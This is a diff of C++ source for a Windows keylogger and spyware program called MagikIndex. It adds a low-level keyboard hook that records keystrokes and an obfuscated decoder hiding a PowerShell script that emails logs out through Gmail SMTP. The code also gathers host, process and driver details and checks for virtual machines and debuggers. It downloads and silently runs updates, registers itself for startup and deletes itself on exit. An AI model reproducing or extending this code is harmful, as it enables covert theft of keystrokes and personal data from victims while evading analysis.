@@ -1,25 +1,19 @@
 #include "common.h"
 #include "logo.h"
 
-//#include "lz4/lz4.h"
-//#include <Wbemidl.h>
-//#include <wbemcli.h>
-
-
 #pragma warning( push )
 #pragma warning( disable : 4477 )
 
-//typedef LONG(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
-//PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
+int Counter;
+bool mutex;
+HHOOK hhkLowLevelKybd;
+Log MyLog;
 
-
-HHOOK keyboardHook;
-
-int main()
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
 
 
-    FreeConsole();
+    //FreeConsole();
 
     CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
@@ -29,7 +23,7 @@ int main()
     SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
 
     DWORD Tick1 = GetTickCount();
-
+    
     int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();
 
     srand(RandSeed);
@@ -40,15 +34,15 @@ int main()
     GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
     std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
     std::string CurrentDir = std::string(PathToFile).substr(0, pos);
-    if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {      //why did i put this here kekw
+    /*if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {      //why did i put this here kekw
         RegisterMyProgramForStartup("MIndex",PathToFile,"rebooted");
         exit(0);
-    }
+    }*/
 
     if (DelayExecution) {
-        int Divider = rand() % 10000 + 100, DividedSleep = (DelayTime + rand()%1000+10) / Divider;
-        LARGE_INTEGER delay;
-        delay.QuadPart = -10000 * (DividedSleep * 1000);
+        int Divider = 20 , DividedSleep = (DelayTime + rand()%100+10) / Divider;
+        //LARGE_INTEGER delay;
+        //delay.QuadPart = -10000 * (DividedSleep * 1000);
         //pNtDelayExecution(FALSE, &delay);
         for (int j = 0; j <= Divider; j++) {
             Sleep(DividedSleep);
@@ -66,8 +60,6 @@ int main()
         CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
     }
 
-    //ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
-
     AntiDBG DebugItem;
     DebugItem.Initialize();
     TrustItems Trust = DebugItem.TrustItem;
@@ -80,22 +72,30 @@ int main()
     }else if (Trust.HasActiveInternet && !Trust.IsInVM) {
         std::string VersionFile = CurrentDir + "\\Version.inf";
         std::string UpdatedExe = CurrentDir + "\\MagikIndekkusu.exe";
+        std::string UpdateLink;
         VersionDownload:
-        URLDownloadToFile(NULL, GitVersionLink, VersionFile.c_str(), 0, NULL);
+        URLDownloadToFileA(NULL, HardDecode(GitVersionLink).c_str(), VersionFile.c_str(), 0, NULL);
         SetFileAttributesA(VersionFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
         std::ifstream VersionFileIO(VersionFile);
         if (!VersionFileIO.eof()) {
-            std::getline(VersionFileIO, VersionFile, '\n');
-            VersionFile.erase(VersionFile.size() - 2);
-            if (strcmp(VersionFile.c_str(), CurrentVersion ) != 0) {
-                std::getline(VersionFileIO, VersionFile, '\n');
-                URLDownloadToFile(NULL, VersionFile.c_str(), UpdatedExe.c_str(), 0, NULL);
-                SetFileAttributesA(UpdatedExe.c_str(), FILE_ATTRIBUTE_HIDDEN);
-                VersionFile = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & start " + UpdatedExe;
+            std::getline(VersionFileIO, UpdateLink, '\n');
+            //VersionFile.erase(VersionFile.size() - 1);
+            if (strcmp(UpdateLink.c_str(), CurrentVersion ) != 0) {
+                std::getline(VersionFileIO, UpdateLink, '\n');
+                URLDownloadToFile(NULL, UpdateLink.c_str(), UpdatedExe.c_str(), 0, NULL);
+                SetFileAttributesA(UpdatedExe.c_str(), FILE_ATTRIBUTE_HIDDEN); 
+                VersionFileIO.close();
+                DeleteFileA(VersionFile.c_str());
+                VersionFile = "/C timeout 3 /nobreak > Nul & start " + UpdatedExe;
                 ShellExecuteA(0, "open", "cmd.exe", VersionFile.c_str(), 0, SW_HIDE);
                 FinalExit();
             }
+            else {
+                VersionFileIO.close();
+                DeleteFileA(VersionFile.c_str());
+            }
         }else {
+            VersionFileIO.close();
             DeleteFileA(VersionFile.c_str());
             if (!ThrowAwayFlag) {
                 ThrowAwayFlag = true;
@@ -112,8 +112,11 @@ int main()
 
 Log:
 
-    Log log;
-    log.CreateLog();
+    hhkLowLevelKybd = 0;
+    Counter = 0;
+    mutex = false;
+
+    MyLog.CreateLog();
 
     DWORD Tick = GetTickCount();
 
@@ -175,56 +178,56 @@ Log:
     StartDate += std::to_string(SysTime.wSecond);
     StartDate += "_________\n";
 
-    log.LogItChar(MyLogo);
-    log.LogItChar("\n");
-    log.LogItChar(StartDate);
+    MyLog.LogItChar(MyLogo);
+    MyLog.LogItChar("\n");
+    MyLog.LogItChar(StartDate);
 
     if (!CryptLogs) {
-        log.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
-        log.LogItChar("Not crypting the logs...");
+        MyLog.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
+        MyLog.LogItChar("Not crypting the logs...");
     }else{
-        log.LogItChar("Started in normal mode...");
+        MyLog.LogItChar("Started in normal mode...");
         CryptText += "Secure Random Key Shift...";
-        log.LogItChar(CryptText);
+        MyLog.LogItChar(CryptText);
     }
 
     if (FirstLog) {
         if (Trust.IsResCheck)
-            log.LogItChar("Resolution ratio mismatch, trust decreased...");
+            MyLog.LogItChar("Resolution ratio mismatch, trust decreased...");
         if (Trust.IsInVM)
-            log.LogItChar("VM Guest specific files found, trust decreased...");
+            MyLog.LogItChar("VM Guest specific files found, trust decreased...");
         if (Trust.IsHostingAVM)
-            log.LogItChar("VM Host specific files found, trust increased...");
+            MyLog.LogItChar("VM Host specific files found, trust increased...");
         if (Trust.IsSmallHardDrive)
-            log.LogItChar("HardDrive is under the set minimum, trust decreased...");
+            MyLog.LogItChar("HardDrive is under the set minimum, trust decreased...");
         if (Trust.IsSmallRAM)
-            log.LogItChar("RAM is under the set minimum, trust decreased...");
+            MyLog.LogItChar("RAM is under the set minimum, trust decreased...");
         if (Trust.IsBeingDebugged)
-            log.LogItChar("Process is being debugged, trust decreased...");
+            MyLog.LogItChar("Process is being debugged, trust decreased...");
         if (Trust.HasOneCore)
-            log.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
+            MyLog.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
         if (Trust.HasMultipleMonitors)
-            log.LogItChar("Multiple monitor setup found, trust increased...");
+            MyLog.LogItChar("Multiple monitor setup found, trust increased...");
         if (Trust.HasBeenTimepatched)
-            log.LogItChar("Process has been timepatched, trust decreased...");
+            MyLog.LogItChar("Process has been timepatched, trust decreased...");
         if (Trust.UserIsInactive)
-            log.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
+            MyLog.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
         if (Trust.HasActiveInternet)
-            log.LogItChar("Active internet connection found, trust increased...");
+            MyLog.LogItChar("Active internet connection found, trust increased...");
         if (Trust.Proxied)
-            log.LogItChar("Proxy/Fake connection found, trust decreased...");
+            MyLog.LogItChar("Proxy/Fake connection found, trust decreased...");
         if (Trust.HasRunningAntiMalware)
-            log.LogItChar("Running Anti-Malware solution found, trust increased...");
+            MyLog.LogItChar("Running Anti-Malware solution found, trust increased...");
         if (Trust.HasMoreThan20Apps)
-            log.LogItChar("More than 20 apps installed, trust increased...");
+            MyLog.LogItChar("More than 20 apps installed, trust increased...");
         if (Trust.ExtUserActivity)
-            log.LogItChar("No user input in the past 15s, trust decreased...");
+            MyLog.LogItChar("No user input in the past 15s, trust decreased...");
     }
 
     if (TrustTooLow) {
-        log.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
-        log.LogItChar("Trust factor too low, quitting...");
-        log.SendLog();
+        MyLog.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
+        MyLog.LogItChar("Trust factor too low, quitting...");
+        MyLog.SendLog();
         FinalExit();                                                                               //could just act normal instead of autodeleting, which is sus
     }
 
@@ -253,7 +256,7 @@ Log:
 
     if (FirstLog) {
 
-        log.LogItChar("First log of the session, copying files and adding to startup...");
+        MyLog.LogItChar("First MyLog of the session, copying files and adding to startup...");
 
         std::string DestinationFile = "C:\\Users\\";
         DestinationFile += UserName;
@@ -269,7 +272,7 @@ Log:
             Command += DestinationFile;
             Command += "\\*.*";
             ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
-            log.LogItChar("Cleaned MagikIndex folder...");
+            MyLog.LogItChar("Cleaned MagikIndex folder...");
             Sleep(200);
         }
         DestinationFile += "\\";
@@ -289,14 +292,14 @@ Log:
 
         CopiedFileText += CopiedFile;
         CopiedFileText += ".exe\"...";
-        log.LogItChar(CopiedFileText);
+        MyLog.LogItChar(CopiedFileText);
 
         RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");
 
-        log.LogItChar("Registered executable for startup...");
+        MyLog.LogItChar("Registered executable for startup...");
 
     }else{
-        log.LogItChar("Not the first log of the session, skip copying files...");
+        MyLog.LogItChar("Not the first MyLog of the session, skip copying files...");
     }
 
     int x1, y1, x2, y2, w, h, mo, mb;
@@ -390,71 +393,71 @@ Log:
     GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGCURRNAME, CurrIdentifier, sizeof(CurrIdentifier));
 
     TimeText += LogTime;
-    log.LogItChar(TimeText);
+    MyLog.LogItChar(TimeText);
 
     ComputerText += HostName;
-    log.LogItChar(ComputerText);
+    MyLog.LogItChar(ComputerText);
 
     UsernameText += UserName;
-    log.LogItChar(UsernameText);
+    MyLog.LogItChar(UsernameText);
 
     InternetText += InternetStatusString;
-    log.LogItChar(InternetText);
+    MyLog.LogItChar(InternetText);
 
     WidthText += Width;
-    log.LogItChar(WidthText);
+    MyLog.LogItChar(WidthText);
 
     HeightText += Height;
-    log.LogItChar(HeightText);
+    MyLog.LogItChar(HeightText);
 
     AspectRatioText += std::to_string(Ratioed);
-    log.LogItChar(AspectRatioText);
+    MyLog.LogItChar(AspectRatioText);
 
     WindowsText += WindowsVersion;
-    log.LogItChar(WindowsText);
+    MyLog.LogItChar(WindowsText);
 
     OEMText += OEMNumber;
-    log.LogItChar(OEMText);
+    MyLog.LogItChar(OEMText);
 
     RAMText += RAMAmount;
     RAMText += " MB";
-    log.LogItChar(RAMText);
+    MyLog.LogItChar(RAMText);
 
     CPUNumberText += CPUCores;
-    log.LogItChar(CPUNumberText);
+    MyLog.LogItChar(CPUNumberText);
 
     CPUTypeText += CPUType;
-    log.LogItChar(CPUTypeText);
+    MyLog.LogItChar(CPUTypeText);
 
     CPUBrand += GetCpuInfo();
-    log.LogItChar(CPUBrand);
+    MyLog.LogItChar(CPUBrand);
 
     GenuineText += IsGenuine;
-    log.LogItChar(GenuineText);
+    MyLog.LogItChar(GenuineText);
 
     MouseText += MouseButtons;
-    log.LogItChar(MouseText);
+    MyLog.LogItChar(MouseText);
 
     MonitorText += Monitors;
-    log.LogItChar(MonitorText);
+    MyLog.LogItChar(MonitorText);
 
     BootText += BootMode;
-    log.LogItChar(BootText);
+    MyLog.LogItChar(BootText);
 
     SlowText += SlowMachine;
-    log.LogItChar(SlowText);
+    MyLog.LogItChar(SlowText);
 
     LanguageText += LanguageIdentifier;
-    log.LogItChar(LanguageText);
+    MyLog.LogItChar(LanguageText);
 
     CurrencyText += CurrIdentifier;
-    log.LogItChar(CurrencyText);
+    MyLog.LogItChar(CurrencyText);
 
     MiddleEastText += MiddleEast;
-    log.LogItChar(MiddleEastText);
+    MyLog.LogItChar(MiddleEastText);
 
     SeedText += std::to_string(RandSeed);
-    log.LogItChar(SeedText);
+    MyLog.LogItChar(SeedText);
 
 
     for (int i = (int)'A'; i < (int)'Z'; i++) {
@@ -478,9 +481,9 @@ Log:
     }
     DiskText.erase(DiskText.size()-2);
     DiskText += "\n";
-    log.LogItChar(DiskText);
+    MyLog.LogItChar(DiskText);
 
-    log.LogItChar("_____________________________________________\nList of running processes: \n");
+    MyLog.LogItChar("_____________________________________________\nList of running processes: \n");
 
     HANDLE hpSnap;
     PROCESSENTRY32 pentry;
@@ -491,44 +494,53 @@ Log:
     else {
         return false;
     }
-
     if (!Process32First(hpSnap, &pentry)) {
         CloseHandle(hpSnap);
         return false;
     }
-
     do {
-        log.LogItChar(pentry.szExeFile);
+        MyLog.LogItChar(pentry.szExeFile);
     } while (Process32Next(hpSnap, &pentry));
 
-    log.LogItChar("\n_____________________________________________\n");
+    MyLog.LogItChar("_____________________________________________\nList of device drivers: \n");
 
-    int ArraySize = 10;
-     int KeyList = {};
-     for (int k = 0; k < CharactersPerLog;) {
-         Sleep(25);
-         for (int i = 8; i < 190; i++) {
-             if (GetAsyncKeyState(i) == -32767) {
-                 log.LogItInt(i);
-                 k++;
-             }
-         }
-     }
-     /*
-     std::string RemoteFile = "Log";
-     RemoteFile += LogTime;
-     RemoteFile += ".txt";
-     FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
-     */
+    LPVOID drivers[1024];
+    DWORD cbNeeded;
+    int cDrivers, i;
+    if (K32EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
+    {
+        char szDriver[1024];
+        cDrivers = cbNeeded / sizeof(drivers[0]);
+        for (i = 0; i < cDrivers; i++)
+        {
+            if (K32GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
+            {
+                MyLog.LogItChar(szDriver);
+            }
+        }
+    }
+    else
+    {
+        MyLog.LogItChar("Not enough memory for driver enumeration.");
+    }
 
-     log.LogItChar("\n_____________________________________________\n");
-     log.LogItChar("Character limit hit, sending log...");
+    MyLog.LogItChar("\n_____________________________________________\n");
 
-     log.SendLog();
-     FirstLog = false;
+    std::thread t1(Hooker);
+    //t1.detach();
+    Sleep(50);
+    while (!mutex) {
+        Sleep(5);
+    }
+    t1.join();
+    MyLog.LogItChar("\n_____________________________________________\n");
+    MyLog.LogItChar("Character limit hit, sending MyLog...");
 
-     goto Log;
-     return 0;
+    MyLog.SendLog();
+    FirstLog = false;
+
+    goto Log;
+    return 0;
 }
 
 int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the directory being   deleted,   without trailing backslash
@@ -739,7 +751,7 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
             std::string PSStartup = "MagikMailer";
             PSStartup += std::to_string(GetTickCount());
             HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-            std::string a = "$online = test-connection 8.8.8.8 -Count 1 -Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('";
+            std::string a = HardDecode("yLqyY[rTpdnTY\\{P2c{;4f2XoVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiOJdjnIfwXI\\nL5Sw:o\\wnGWW32WmqS\\3LJfmCURiy4eVXIdkHodH7{do7YUSTXVVTkEreFQ3CEN{Xof{X4WyTZdVTEM27Y\\rz4SyTZdV7EdrHYVwSZ\\QDEflXock;WN5XoVi2FKx\\odLDHXPPHLMeUdxPoNunY[vfoNyTZd|fEK;Cken\\penPHWW32WmqygMmU\\wnIdw;ILqCk\\rrCfnnYfT3EKzCEfwX5dF3EK66EQwilN6CkdxnIflXodw;4[vS5enTJK;CU\\wnIdw;IL");
             a += SendersEmail;
             a += "', '";
             a += SendersPsw;
@@ -878,21 +890,76 @@ std::string GetCpuInfo()
     return cpu;
 }
 
-bool fexists(std::string filename) {
+BOOL fexists(std::string filename) {
     DWORD dwAttrib = GetFileAttributes(filename.c_str());
 
-    if(dwAttrib != INVALID_FILE_ATTRIBUTES)
-        return true;
+    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
+        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
 }
 
 void FinalExit() {
     char PathToSelf[MAX_PATH];
     GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
-    std::string Command = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & Del /f /q \"";
+    std::string Command = "/C timeout 3 /nobreak > Nul & Del /f /q \"";
     Command += PathToSelf;
     Command += "\"";
     ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
     exit(0);
+}
+
+std::string HardDecode(std::string EncodedString) {
+    std::string Ret = { NULL };
+    std::string Buf;
+    for (int i = EncodedString.size() - 1; i >= 0; i--) {
+        Buf += EncodedString[i] - 1;
+    }
+    Base64::decode(Buf, &Ret);
+    return Ret;
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    BOOL fEatKeystroke = FALSE;
+    KBDLLHOOKSTRUCT* keyboard = (KBDLLHOOKSTRUCT*)lParam;
+    if (nCode == HC_ACTION)
+    {
+        switch (wParam)
+        {
+        case WM_KEYDOWN:
+            if (Counter >= CharactersPerLog) {
+                mutex = true;
+                ExitThread(0);
+            }
+            Counter++;
+            MyLog.LogItInt(keyboard->vkCode);
+
+            break;
+        case WM_SYSKEYDOWN:
+            break;
+        case WM_KEYUP:
+            break;
+        case WM_SYSKEYUP:
+            break;
+        }
+    }
+    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
+}
+
+int Hooker()
+{
+    // Install the low-level keyboard & mouse hooks
+    HHOOK hhkLowLevelKybd = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
+
+    // Keep this app running until we're told to stop
+    MSG msg;
+    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(hhkLowLevelKybd);
+
+    return(0);
 }
 
 
